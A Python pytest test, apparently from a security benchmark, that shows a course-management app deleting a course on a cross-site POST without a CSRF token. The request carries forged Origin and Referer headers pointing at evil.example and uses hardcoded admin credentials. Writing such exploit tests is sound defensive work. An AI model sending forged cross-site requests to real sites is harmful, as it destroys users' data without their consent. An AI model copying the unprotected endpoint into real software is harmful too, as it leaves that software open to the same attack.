from helpers import login, create_course, count_rows


def test_exploit_course_delete_accepts_cross_site_post_without_csrf_token(client, app_instance):
    session, base_url = client
    db_path = app_instance['db_path']

    assert login(session, base_url, 'admin', 'admin123').status_code == 200
    course = create_course(session, base_url, 'CSRF Target', 'delete me').json()['course']
    course_id = course['course_id']

    before = count_rows(db_path, 'SELECT COUNT(*) FROM courses WHERE course_id=?', (course_id,))
    assert before == 1

    r = session.post(
        f'{base_url}/courses/{course_id}/delete',
        data={},
        headers={
            'Origin': 'http://evil.example',
            'Referer': 'http://evil.example/csrf.html',
            'Accept': 'text/html',
        },
        allow_redirects=False,
        timeout=5,
    )
    assert r.status_code in (200, 302, 303), r.text

    after = count_rows(db_path, 'SELECT COUNT(*) FROM courses WHERE course_id=?', (course_id,))
    assert after == 0
